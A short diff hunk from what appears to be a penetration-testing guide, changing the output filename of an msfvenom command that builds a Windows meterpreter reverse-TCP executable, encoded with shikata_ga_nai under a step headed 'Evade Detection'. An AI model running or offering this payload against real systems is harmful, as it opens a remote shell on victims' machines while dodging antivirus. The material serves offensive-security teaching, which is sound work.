@@ -16,7 +16,7 @@
    - `-o`: Output file path.
 3. **Generate Encoded Payload** (Evade Detection):
    ```
-   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
+   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
    ```
    - `-a x86`: 32-bit architecture.
    - `-b "\x00"`: Avoid bad characters.
